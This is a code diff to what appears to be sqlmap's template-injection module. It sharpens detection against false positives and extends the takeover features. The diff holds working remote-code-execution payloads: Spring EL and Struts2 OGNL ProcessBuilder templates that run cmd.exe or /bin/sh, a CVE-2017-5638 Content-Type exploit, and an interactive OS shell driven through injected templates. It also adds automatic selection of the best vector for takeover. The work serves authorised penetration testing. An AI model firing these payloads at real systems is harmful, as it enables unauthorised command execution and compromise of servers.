@@ -23,6 +23,8 @@ from lib.core.enums import PLACE
 from lib.core.settings import SSTI_ERROR_SIGNATURES
 from lib.core.settings import UPPER_RATIO_BOUND
 from lib.request.connect import Connect as Request
+from lib.utils.nonsql import ratio as _ratio
+from lib.utils.nonsql import blockedStatus
 from thirdparty.six.moves.urllib.parse import quote as _quote
 
 
@@ -211,8 +213,6 @@ _ENGINE_TABLE = (
 )
 
 
-def _ratio(first, second):
-    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()
 
 
 def _delim(place):
@@ -273,11 +273,15 @@ def _send(place, parameter, value):
         kwargs = {"raise404": False, "silent": True}
         if conf.verbose >= 3:
             logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
-        page, _, _ = Request.getPage(**kwargs)
+        page, _, code = Request.getPage(**kwargs)
+        # a transport failure or a BLOCKED/ERROR status (5xx, 403/429) is not a usable oracle sample -
+        # signal None so the detection routines (which reject None) can never decide on it
+        if blockedStatus(code):
+            return None
         return page or ""
     except Exception as ex:
         logger.debug("SSTI probe request failed: %s" % getUnicode(ex))
-        return ""
+        return None
     finally:
         conf.parameters[place] = old_params
 
@@ -461,21 +465,38 @@ def _detectBoolean(place, parameter, engine):
     """Establish a boolean oracle for this engine. Returns the true template or None."""
     original = _originalValue(place, parameter) or ""
 
+    # arithmetic-only engines (e.g. Struts2 OGNL) carry no boolean payloads - nothing to do here
+    if not engine.booleanTrue or not engine.booleanFalse:
+        return None
+
     truePayload = original + engine.booleanTrue
     falsePayload = original + engine.booleanFalse
 
-    if engine.trueRendered:
-        truePage = _send(place, parameter, truePayload)
-        if not truePage:
-            return None
-        text = getUnicode(truePage)
-        if truePayload in text or engine.trueRendered not in text:
-            return None
-
-    # Reject reflected false payload
+    truePage = _send(place, parameter, truePayload)
     falsePage = _send(place, parameter, falsePayload)
-    if falsePage and falsePayload in getUnicode(falsePage):
+    if not truePage or not falsePage:
         return None
+
+    trueText, falseText = getUnicode(truePage), getUnicode(falsePage)
+
+    # a raw payload surviving in the response means the template did NOT evaluate it
+    if truePayload in trueText or falsePayload in falseText:
+        return None
+
+    # an engine ERROR page is not a valid boolean rendering: a syntactically invalid true/false pair
+    # that merely trips two DIFFERENT error messages would otherwise diverge and fake an oracle
+    if _isError(truePage, engine) or _isError(falsePage, engine):
+        return None
+
+    if engine.trueRendered:
+        # attribution guard: the true marker must be ABSENT from the untouched baseline (else it is
+        # page furniture, not our evaluated output), PRESENT in the true page, and ABSENT from the
+        # false page - so the divergence is provably OUR rendered boolean, not incidental page drift
+        baseline = getUnicode(_send(place, parameter, original) or "")
+        if engine.trueRendered in baseline:
+            return None
+        if engine.trueRendered not in trueText or engine.trueRendered in falseText:
+            return None
 
     return _boolean(lambda p=truePayload: _send(place, parameter, p),
                     lambda p=falsePayload: _send(place, parameter, p))
@@ -561,7 +582,12 @@ def _fingerprint(place, parameter):
         if bestEngine is engine and evidence.get("arithmetic") and engine.delimiter not in _SHARED_DELIMITERS:
             break
 
-    if bestEngine and bestScore >= 3:
+    # CONFIRMED requires an EVALUATION proof - in-band arithmetic (randomized pair) or a template
+    # boolean oracle. Weak signals (error / distinguishing / family) are NOT summed into a
+    # confirmation: the old `score >= 3` let boolean+error, distinguishing+error, or even a lone
+    # generic parser error "confirm" SSTI with no proof the template actually evaluated our input
+    # (and then drive automatic RCE on an unproven finding).
+    if bestEngine and (bestEvidence.get("arithmetic") or bestEvidence.get("boolean")):
         # For engines with ambiguous delimiters (shared by multiple engines),
         # name a specific engine when: error fingerprint, distinguishing probe,
         # or boolean rendering is unique within the delimiter family.
@@ -580,20 +606,20 @@ def _fingerprint(place, parameter):
                     name="%s (probable %s)" % (_FAMILY[bestEngine.delimiter], bestEngine.name))
         return bestEngine, bestEvidence
 
-    # Fallback: generic error detection
-    errorBackend = None
+    # weak signals only (parser reachable, but NO evaluation proof) -> informational, NOT confirmed
+    if bestEngine and bestScore >= 1:
+        logger.info("%s parameter '%s' reaches a template parser (evidence: %s) but SSTI is NOT "
+                    "confirmed - no arithmetic/boolean evaluation proof" % (place, parameter, ",".join(sorted(bestEvidence)) or "error"))
+        return None, None
+
+    # generic parser-family error only -> informational, never a confirmed engine
     for suffix in ("{{", "${", "<%=", "#{"):
         page = _send(place, parameter, _originalValue(place, parameter) + suffix)
-        if page:
-            backend = _backendFromError(page)
-            if backend:
-                errorBackend = backend
-                break
-
-    if errorBackend:
-        for engine in _ENGINE_TABLE:
-            if engine.name.lower() in errorBackend.lower():
-                return engine, {"error": True}
+        backend = _backendFromError(page) if page else None
+        if backend:
+            logger.info("%s parameter '%s' triggers a %s template-parser error, but SSTI is NOT "
+                        "confirmed (no evaluation proof)" % (place, parameter, backend))
+            break
 
     return None, None
 
@@ -605,8 +631,11 @@ def sstiScan():
     logger.debug(debugMsg)
 
     # CVE-2017-5638 (S2-045): OGNL via the Content-Type header - a distinct, non-reflected Struts2
-    # vector that needs no request parameter, so it is probed once up front.
-    if _probeStruts2Header(conf.url):
+    # vector that needs no request parameter, so it is probed once up front. Reporting it must NOT
+    # short-circuit the rest of the scan: request PARAMETERS can be independently SSTI-injectable and
+    # were previously never tested once this fired.
+    struts2 = _probeStruts2Header(conf.url)
+    if struts2:
         logger.info("%s header is vulnerable to SSTI (back-end: 'Struts2 (OGNL)', CVE-2017-5638)" % HTTP_HEADER.CONTENT_TYPE)
         if conf.beep:
             beep()
@@ -621,11 +650,12 @@ def sstiScan():
             _dumpS2045(conf.url, conf.osCmd)
         if conf.get("osShell"):
             _osShell(lambda cmd: _dumpS2045(conf.url, cmd))
-        logger.info("SSTI scan complete")
-        return
 
     if not conf.paramDict:
-        logger.error("no request parameters to test (use --data, GET params, or similar)")
+        if not struts2:
+            logger.error("no request parameters to test (use --data, GET params, or similar)")
+        else:
+            logger.info("SSTI scan complete")
         return
 
     tested = 0
@@ -649,7 +679,10 @@ def sstiScan():
                 if conf.beep:
                     beep()
 
-                if engine.arithmeticFmt:
+                # report the payload that ACTUALLY proved the finding, not merely one the engine
+                # supports - showing the 7*7 arithmetic payload when only the boolean oracle fired
+                # misrepresents what was tested
+                if evidence.get("arithmetic") and engine.arithmeticFmt:
                     payload = _originalValue(place, parameter) + _arithmeticPayload(engine.arithmeticFmt, 7, 7)
                 else:
                     payload = _originalValue(place, parameter) + engine.booleanTrue
@@ -676,31 +709,44 @@ def sstiScan():
             logger.info("back-end template engines: %s" % ", ".join(sorted(engines)))
 
     if found:
-        slot = found[0]
-        place, parameter, engine, evidence = slot
-
         wantsTakeover = any(conf.get(_) for _ in ("osCmd", "osShell"))
 
-        # If the user did not ask for exploitation, confirm (benignly) whether OS command
-        # execution is reachable and, if so, advise the relevant switches.
-        if not wantsTakeover and _canTakeover(engine, evidence) and _probeRce(place, parameter, engine):
-            logger.info("the back-end '%s' allows OS command execution via this injection; "
-                        "you are advised to try '--os-shell' (interactive) or "
-                        "'--os-cmd=<command>' (single command)" % engine.name)
+        # Rank ALL confirmed vectors, not just found[0]: automatic exploitation must select the
+        # strongest VERIFIED takeover vector - the first confirmed slot may not support command
+        # execution while a later one does. Candidates are the exact-engine, proof-backed slots; the
+        # winner is the first whose reflection-proof RCE capability actually confirms.
+        candidates = [(pl, pr, en, ev) for (pl, pr, en, ev) in found if _canTakeover(en, ev)]
+        rceSlot = None
+        for pl, pr, en, ev in candidates:
+            if _probeRce(pl, pr, en):
+                rceSlot = (pl, pr, en, ev)
+                break
 
+        # `--ssti` is an auxiliary, self-contained switch, so once SSTI is confirmed we AUTOMATICALLY
+        # probe whether OS command execution is reachable and advise the takeover switches. Users of
+        # this niche switch generally don't know to try --os-shell/--os-cmd (actual execution still
+        # requires those switches).
+        if not wantsTakeover:
+            if rceSlot:
+                _, _, en, _ = rceSlot
+                logger.info("the back-end '%s' allows OS command execution via %s parameter '%s'; you "
+                            "are advised to try '--os-shell' (interactive) or '--os-cmd=<command>' "
+                            "(single command)" % (en.name, rceSlot[0], rceSlot[1]))
         # --os-cmd / --os-shell: RCE via SSTI (reuses existing SQL takeover flags)
-        if conf.get("osCmd") or conf.get("osShell"):
-            if not _canTakeover(engine, evidence):
-                logger.error("takeover requires exact engine fingerprint (got '%s') and "
-                             "confirmed proof (arithmetic or boolean oracle)" % engine.name)
-            else:
-                if conf.get("osCmd"):
-                    _executeCommand(place, parameter, engine, conf.osCmd)
+        elif not candidates:
+            logger.error("takeover requires an exact engine fingerprint and confirmed proof "
+                         "(arithmetic or boolean oracle); none of the confirmed vectors qualify")
+        else:
+            # prefer the capability-verified vector; fall back to the first takeover-capable candidate
+            # (the user explicitly asked, and _executeCommand carries its own capture fallbacks)
+            pl, pr, en, ev = rceSlot or candidates[0]
+            if conf.get("osCmd"):
+                _executeCommand(pl, pr, en, conf.osCmd)
 
-                # Interactive shell runs even under --batch (mirrors the SQL --os-shell, which
-                # reads commands straight from the terminal); EOF / 'exit' / 'quit' leaves it.
-                if conf.get("osShell"):
-                    _osShell(lambda cmd: _executeCommand(place, parameter, engine, cmd))
+            # Interactive shell runs even under --batch (mirrors the SQL --os-shell, which reads
+            # commands straight from the terminal); EOF / 'exit' / 'quit' leaves it.
+            if conf.get("osShell"):
+                _osShell(lambda cmd: _executeCommand(pl, pr, en, cmd))
 
     logger.info("SSTI scan complete")
 
@@ -738,6 +784,58 @@ _FILE_RCE = {
     ),
 }
 
+# Windows variants of the Java file-based channel: exec via cmd.exe (/bin/sh does not exist), read back
+# the same way. Selected by _fileRceCapture when the Unix family did not confirm execution.
+_FILE_RCE_WINDOWS = {
+    "Spring EL / Thymeleaf": (
+        "${new ProcessBuilder(new String[]{'cmd.exe','/c','{CMD} > {OUTFILE} 2>&1'}).start()}",
+        "${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('{OUTFILE}')))}",
+    ),
+    "Struts2 (OGNL)": (
+        "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'cmd.exe','/c','{CMD} > {OUTFILE} 2>&1'})).(#p.start())}",
+        "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(new java.lang.String(@java.nio.file.Files@readAllBytes(new java.io.File('{OUTFILE}').toPath())))}",
+    ),
+}
+
+
+# --- OS/shell-family RCE command builders -----------------------------------
+# Reflection-proof primitives per family; `_probeRce`/`_executeCommand` try each family (Unix first) so
+# takeover works on a Windows-hosted template engine without a separate OS-detection round-trip.
+#   challenge(a, b)            -> a command whose STDOUT is the derived product a*b (never in the request)
+#   framed(cmd, sa, sb, ea, eb) -> a command printing <sa><sb><cmd-stdout><ea><eb>, the markers built by
+#                              RUNTIME concatenation so the completed marker never appears in the request
+def _unixChallenge(a, b):
+    return "echo $((%d*%d))" % (a, b)
+
+
+def _winChallenge(a, b):
+    # `set /a` evaluates integer arithmetic and prints the result; cmd /c so it runs even when the engine
+    # execs a binary directly (Runtime.exec) rather than through a shell
+    return "cmd /c set /a %d*%d" % (a, b)
+
+
+def _unixFramed(cmd, sa, sb, ea, eb):
+    # printf concatenates its two %s (sa+sb / ea+eb) at runtime; the request carries them separated
+    return "printf %%s%%s %s %s; %s; printf %%s%%s %s %s" % (sa, sb, cmd, ea, eb)
+
+
+def _winFramed(cmd, sa, sb, ea, eb):
+    # `echo|set /p=X` prints X with NO trailing newline; `&` sequences the commands, so stdout is the
+    # runtime concatenation <sa><sb><cmd-stdout><ea><eb> - the joined markers are absent from the request
+    return 'cmd /c "echo|set /p=%s&echo|set /p=%s&%s&echo|set /p=%s&echo|set /p=%s"' % (sa, sb, cmd, ea, eb)
+
+
+_SHELL_FAMILIES = (
+    ("unix", _unixChallenge, _unixFramed),
+    ("windows", _winChallenge, _winFramed),
+)
+
+# per-family temp file + cleanup for the Java file-based channel
+_FILE_TEMP = {
+    "unix": (lambda name: "/tmp/%s" % name, _FILE_RCE, lambda f: "rm -f %s" % f),
+    "windows": (lambda name: "%%TEMP%%\\%s" % name, _FILE_RCE_WINDOWS, lambda f: "cmd /c del /q %s" % f),
+}
+
 
 def _commandOutput(page, baseline, original, payload, engine):
     """Extract genuine command output from a response via baseline diff, rejecting error pages and
@@ -764,7 +862,10 @@ def _commandOutput(page, baseline, original, payload, engine):
         output = output.strip()
 
     # A template that ECHOED our payload directive instead of executing it is reflection, not output.
-    if output and output in payload:
+    # The test is whether the injected DIRECTIVE leaked into the response (payload fragment present in
+    # output), NOT whether the output happens to be a substring of the payload - the latter discarded
+    # legitimate results such as `echo hello` -> "hello" (naturally a substring of "...echo hello...").
+    if output and payload and (payload in output or _ratio(output, payload) >= UPPER_RATIO_BOUND):
         return None
 
     # A bare Process-object toString ("Process[pid=..]" on JDK9+, "java.lang.UNIXProcess@.."/"ProcessImpl@.."
@@ -782,71 +883,166 @@ def _commandOutput(page, baseline, original, payload, engine):
 
 def _fileRceCapture(place, parameter, engine, original, cmd, extract):
     """Two-step file-based RCE for JDK-hardened Java engines (see _FILE_RCE): fire the exec payload
-    (redirects the command's output to a random temp file), then poll-read that file. 'extract' is a
-    callback (readPayload, page) -> result-or-None. The temp-file write is async of the blind start(),
-    so the read is retried a few times. Returns whatever 'extract' yields, else None."""
-    spec = _FILE_RCE.get(engine.name)
-    if not spec:
-        return None
+    (redirects the command's output to a random temp file), then poll-read that file. Tries the Unix
+    family (/tmp, /bin/sh) then the Windows family (%TEMP%, cmd.exe). 'extract' is a callback
+    (readPayload, page) -> result-or-None. The temp-file write is async of the blind start(), so the read
+    is retried a few times. Returns whatever 'extract' yields, else None."""
+    for family, (tempPath, specs, cleanupCmd) in _FILE_TEMP.items():
+        spec = specs.get(engine.name)
+        if not spec:
+            continue
 
-    execTemplate, readTemplate = spec
-    outFile = "/tmp/%s" % randomStr(length=12, lowercase=True)
-    execPayload = execTemplate.replace("{CMD}", _escapeSingleQuoted(cmd)).replace("{OUTFILE}", outFile)
-    _send(place, parameter, original + execPayload)   # launches the process; its (error) response is ignored
+        execTemplate, readTemplate = spec
+        outFile = tempPath(randomStr(length=12, lowercase=True))
+        execPayload = execTemplate.replace("{CMD}", _escapeSingleQuoted(cmd)).replace("{OUTFILE}", outFile)
+        _send(place, parameter, original + execPayload)   # launches the process; its (error) response is ignored
 
-    readPayload = readTemplate.replace("{OUTFILE}", outFile)
-    for _ in range(3):
-        page = _send(place, parameter, original + readPayload)
-        result = extract(readPayload, page)
+        readPayload = readTemplate.replace("{OUTFILE}", outFile)
+        result = None
+        for _ in range(3):
+            page = _send(place, parameter, original + readPayload)
+            result = extract(readPayload, page)
+            if result is not None:
+                break
+            time.sleep(1)
+
+        # best-effort cleanup: don't leave the random temp file behind on the target
+        try:
+            cleanup = execTemplate.replace("{CMD}", _escapeSingleQuoted(cleanupCmd(outFile))).replace("{OUTFILE}", outFile)
+            _send(place, parameter, original + cleanup)
+        except Exception:
+            pass
         if result is not None:
             return result
-        time.sleep(1)
     return None
 
 
+def _derivedExecuted(page, baseline, expected):
+    """Reflection-proof proof-of-execution test using a DERIVED challenge. The probe runs `echo
+    $((A*B))`: only A and B appear in the request, never their product. A template/app that merely
+    REFLECTS the request - raw, URL-encoded, HTML-escaped, or otherwise transformed - therefore CANNOT
+    reproduce the product, because it is not present anywhere in the payload. So the product appearing
+    in the response, and being absent from the untouched baseline, is genuine command output. Returns
+    True or None (None keeps the _fileRceCapture callback contract)."""
+    if not page or (baseline and expected in baseline):
+        return None
+    return True if expected in page else None
+
+
 def _probeRce(place, parameter, engine):
-    """Benign, quiet RCE-capability check: run `echo <marker>` via the engine's RCE payloads and
-    return True if the marker is reflected (proving OS command execution is reachable). Used only
-    to advise the user; it has no side effect beyond echoing a random token."""
+    """Quiet RCE-capability check: run a DERIVED arithmetic challenge (`echo $((A*B))`) via the engine's
+    RCE payloads and confirm OS command execution is reachable. Used to advise the user once SSTI is
+    confirmed. The expected result (the product) is NOT present in the request, so no reflection -
+    encoded or not - can fake it (see _derivedExecuted); two independently-randomized confirmations are
+    required. In-band capture is tried first; if blocked (e.g. a hardened JDK whose stdout capture is
+    reflectively disabled) it confirms via the two-step file-based channel (inherently reflection-proof
+    - the value comes from shell evaluation into a file we wrote - and self-cleans)."""
 
     if not engine.rcePayloads:
         return False
 
-    marker = randomStr(length=12, lowercase=True)
     original = _originalValue(place, parameter) or ""
-    for payloadTemplate, _description in engine.rcePayloads:
-        payload = payloadTemplate.replace("{CMD}", "echo %s" % marker)
-        page = _send(place, parameter, original + payload)
-        if page and marker in getUnicode(page):
-            return True
+    baseline = getUnicode(_send(place, parameter, original) or "")
 
-    # in-band capture blocked (e.g. hardened JDK) -> confirm via the two-step file-based channel
-    return bool(_fileRceCapture(place, parameter, engine, original, "echo %s" % marker,
-                                lambda readPayload, page: True if (page and marker in getUnicode(page)) else None))
+    # COUNT confirmations, not loop iterations: a challenge whose product coincidentally collides with
+    # the baseline is skipped and REGENERATED (it does not count as a confirmation), so an all-collision
+    # run can never fall through the loop and return success with zero executed payloads.
+    confirmed = generated = 0
+    while confirmed < 2 and generated < 10:
+        generated += 1
+        a, b = randomInt(4), randomInt(4)
+        expected = str(a * b)
+        if expected in baseline or expected in (str(a) + str(b)):   # coincidental collision -> regenerate
+            continue
+
+        hit = False
+        # try each OS/shell family's derived challenge (Unix first, then Windows `set /a`)
+        for _family, challenge, _framed in _SHELL_FAMILIES:
+            cmd = challenge(a, b)
+            for payloadTemplate, _description in engine.rcePayloads:
+                payload = payloadTemplate.replace("{CMD}", cmd)
+                page = getUnicode(_send(place, parameter, original + payload) or "")
+                if _derivedExecuted(page, baseline, expected):
+                    hit = True
+                    break
+            if hit:
+                break
+
+        if not hit:
+            # in-band capture blocked -> confirm via the two-step file-based channel (self-cleaning);
+            # a Unix-family challenge is fine here (the file channel picks the OS family itself)
+            hit = bool(_fileRceCapture(place, parameter, engine, original, _unixChallenge(a, b),
+                                       lambda readPayload, page: _derivedExecuted(getUnicode(page or ""), baseline, expected)))
+        if not hit:
+            return False
+        confirmed += 1
+
+    return confirmed >= 2
+
+
+def _framedOutput(page, start, end):
+    """Slice a command's real stdout from a response that bracketed it between two DERIVED markers. Each
+    marker is the concatenation of two random fragments that the shell joins at runtime (`printf %s%s A
+    B` -> `AB`); the completed marker `AB` never appears literally in the request (which carries `A B`
+    separated), so a reflected payload - raw, URL-encoded, HTML-escaped, whitespace/case-normalized -
+    cannot reproduce it. Finding both markers in order therefore proves execution, and the text between
+    them is genuine output. Returns the sliced text or None."""
+    if not page or start not in page:
+        return None
+    i = page.index(start) + len(start)
+    j = page.find(end, i)
+    if j < 0:
+        return None
+    return page[i:j].strip()
 
 
 def _executeCommand(place, parameter, engine, cmd):
-    """Execute an OS command via the engine's RCE payloads, trying each fallback in order until one
-    produces output (captured via baseline diff), then a two-step file-based fallback for JDK-hardened
-    Java engines whose in-band stdout capture is reflectively blocked (see _FILE_RCE)."""
+    """Execute an OS command via the engine's RCE payloads. Preferred capture brackets the command's
+    output between two random markers so it slices out cleanly - immune to dynamic page material and to
+    reflection. Falls back to a baseline diff for engines whose RCE payload does not run through a shell
+    (no ';' sequencing), then to a two-step file-based capture for JDK-hardened Java engines whose in-band
+    stdout is reflectively blocked (see _FILE_RCE)."""
 
     safeCmd = _escapeSingleQuoted(cmd)
     original = _originalValue(place, parameter) or ""
     baseline = _send(place, parameter, original)
 
-    for payloadTemplate, description in engine.rcePayloads:
-        payload = payloadTemplate.replace("{CMD}", safeCmd)
-        page = _send(place, parameter, original + payload)
-        output = _commandOutput(page, baseline, original, payload, engine)
-        if output is not None:
-            conf.dumper.singleString("\nos-shell (%s) [%s]:\n%s" % (cmd, description, output))
-            return
+    # (1) reflection-proof boundary-marker capture. Each marker is a RUNTIME concatenation of two
+    # fragments (`printf %s%s A B` -> `AB` on Unix; `echo|set /p=A&echo|set /p=B` -> `AB` on Windows),
+    # so the completed marker `AB` is never literally in the request - encoded/escaped reflection cannot
+    # forge it. Both OS families are tried (Unix first); the one whose shell actually runs wins.
+    for _family, _challenge, framed in _SHELL_FAMILIES:
+        sa, sb, ea, eb = (randomStr(6, lowercase=True) for _ in range(4))
+        start, end = sa + sb, ea + eb
+        framedCmd = _escapeSingleQuoted(framed(cmd, sa, sb, ea, eb))
+        for payloadTemplate, description in engine.rcePayloads:
+            payload = payloadTemplate.replace("{CMD}", framedCmd)
+            page = getUnicode(_send(place, parameter, original + payload) or "")
+            out = _framedOutput(page, start, end)
+            if out is not None:
+                conf.dumper.singleString("\nos-shell (%s) [%s]:\n%s" % (cmd, description, out))
+                return
 
+    # (2) file-based capture (JDK-hardened Java engines) - reflection-proof (reads a file we wrote)
     output = _fileRceCapture(place, parameter, engine, original, cmd,
                              lambda readPayload, page: _commandOutput(page, baseline, original, readPayload, engine))
     if output is not None:
         conf.dumper.singleString("\nos-shell (%s) [file-based]:\n%s" % (cmd, output))
         return
+
+    # (3) LAST resort: unframed payload + baseline diff. This channel is NOT reflection-proof - a
+    # baseline difference can be dynamic page material (a rotating CSRF token, timestamp, ad, request
+    # id), so its output is shown only with an explicit UNVERIFIED caveat, never as clean stdout. The
+    # command DID execute (blind), but the displayed text may not be its output.
+    for payloadTemplate, description in engine.rcePayloads:
+        payload = payloadTemplate.replace("{CMD}", safeCmd)
+        page = _send(place, parameter, original + payload)
+        output = _commandOutput(page, baseline, original, payload, engine)
+        if output is not None:
+            logger.warning("blind execution confirmed but no reflection-proof output channel; the text "
+                           "below is an UNVERIFIED baseline diff and may include dynamic page material")
+            conf.dumper.singleString("\nos-shell (%s) [%s, UNVERIFIED diff]:\n%s" % (cmd, description, output))
+            return
 
     logger.warning("no output received for OS command '%s'" % cmd)
 
@@ -893,26 +1089,44 @@ def _s2045Send(url, action):
 
 
 def _probeStruts2Header(url):
-    """Detect CVE-2017-5638 benignly: print a random marker to the response via OGNL (no command
-    execution) and confirm it echoes back. Returns the marker on success, else None."""
-    marker = randomStr(length=16, lowercase=True)
-    action = "(#w=#resp.getWriter()).(#w.print('%s')).(#w.flush())" % marker
-    page = _s2045Send(url, action)
-    return marker if (page and marker in page) else None
+    """Detect CVE-2017-5638 with a reflection-PROOF derived challenge. Rather than printing a literal
+    marker (which a server that merely reflects the Content-Type header would echo back -> false
+    positive), have OGNL COMPUTE an arithmetic product and print it: only the operands A and B appear in
+    the header, never the product, so no header reflection - raw, HTML-escaped or URL-encoded - can
+    reproduce it. Requires TWO independently-randomized confirmations against a baseline. Returns True on
+    confirmed execution, else None."""
+    baseline = _s2045Send(url, "(#resp.getWriter().flush())")      # benign no-op baseline (no marker)
+    # COUNT confirmations, not iterations: a product colliding with the baseline is regenerated, so an
+    # all-collision run can never return success without an actually-evaluated challenge.
+    confirmed = generated = 0
+    while confirmed < 2 and generated < 10:
+        generated += 1
+        a, b = randomInt(4), randomInt(4)
+        expected = str(a * b)
+        if expected in (baseline or "") or expected in (str(a) + str(b)):
+            continue                                                # coincidental collision -> regenerate
+        action = "(#w=#resp.getWriter()).(#w.print(%d*%d)).(#w.flush())" % (a, b)
+        page = _s2045Send(url, action)
+        if not (page and expected in page and expected not in (baseline or "")):
+            return None
+        confirmed += 1
+    return True if confirmed >= 2 else None
 
 
 def _executeStruts2Header(url, cmd):
     """Run an OS command through the S2-045 Content-Type vector and return its stdout. The output is
-    bracketed by random markers (echoed by the shell) so it slices cleanly out of a response that also
-    carries the action's own HTML."""
-    start, end = randomStr(length=10, lowercase=True), randomStr(length=10, lowercase=True)
-    wrapped = "echo %s; %s 2>&1; echo %s" % (start, cmd, end)
+    bracketed by DERIVED markers - each is two random fragments the shell concatenates at runtime
+    (`printf %s%s A B` -> `AB`), so the completed marker never appears literally in the header and a
+    reflected header cannot forge it (nor be sliced as fake 'output')."""
+    sa, sb, ea, eb = (randomStr(6, lowercase=True) for _ in range(4))
+    start, end = sa + sb, ea + eb
+    wrapped = "printf %%s%%s %s %s; %s 2>&1; printf %%s%%s %s %s" % (sa, sb, cmd, ea, eb)
     action = ("(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','%s'}))."
               "(#p.redirectErrorStream(true)).(#pr=#p.start())."
               "(@org.apache.commons.io.IOUtils@copy(#pr.getInputStream(),#resp.getOutputStream()))."
               "(#resp.getOutputStream().flush())") % _escapeSingleQuoted(wrapped)
     page = _s2045Send(url, action)
-    if start in page and end in page:
+    if start in page and end in page and page.index(start) < page.index(end):
         return page.split(start, 1)[-1].split(end, 1)[0].strip("\r\n")
     return None
 
